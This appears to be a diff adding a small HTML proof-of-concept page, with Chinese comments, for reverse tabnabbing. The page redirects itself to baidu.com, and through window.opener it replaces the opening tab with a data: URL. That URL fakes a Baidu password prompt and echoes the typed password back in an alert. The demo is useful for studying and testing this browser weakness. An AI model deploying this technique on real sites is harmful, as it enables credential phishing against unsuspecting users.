@@ -1,0 +1,24 @@
+<html>
+  <body>
+    <script>
+      // 将当前窗口重定向到 baidu首页
+      location = 'https://www.baidu.com';
+      
+      function go() {
+        // 检查当前窗口是否由其他窗口打开（如弹出窗口）
+        if(window.opener) {
+          // 将打开该窗口的窗口位置设置为一个数据 URL
+          window.opener.location = 'data:text/html,<title>test</title><script>' +
+          // 弹出一个提示框，要求用户输入密码
+          'pass = prompt("https://baidu.com\nType  your password:\n");' +
+          // 显示一个警告框，显示用户输入的密码
+          'alert("Your Password is: "+pass);' +
+          '<\/script>';
+        }
+      }
+      
+      // 调用 go 函数
+      go();
+    </script>
+  </body>
+</html>
